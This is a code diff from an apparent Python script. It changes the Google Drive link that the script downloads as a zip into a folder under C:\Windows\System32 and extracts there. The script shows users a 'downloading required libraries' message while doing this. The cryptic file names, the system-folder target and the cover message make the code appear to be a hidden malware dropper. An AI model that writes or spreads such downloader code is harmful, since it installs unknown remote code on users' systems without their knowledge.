@@ -195,7 +195,7 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\SRM\\aestr1gV1.0.py"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1Hiwd5pda2xluupedlaDIE5as6opFkE9Z", "C:\\Windows\\System32\\MSRX\\mydrx.zip")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1G1q1c_AivLof92uU2ybaWtRbtLdIeKkA", "C:\\Windows\\System32\\SRM\\xxtr1g.zip")
     zip_file = r'C:\Windows\System32\SRM\xxtr1g.zip'
     extract_dir = r'C:\Windows\System32\SRM'
     extract_zip(zip_file, extract_dir)
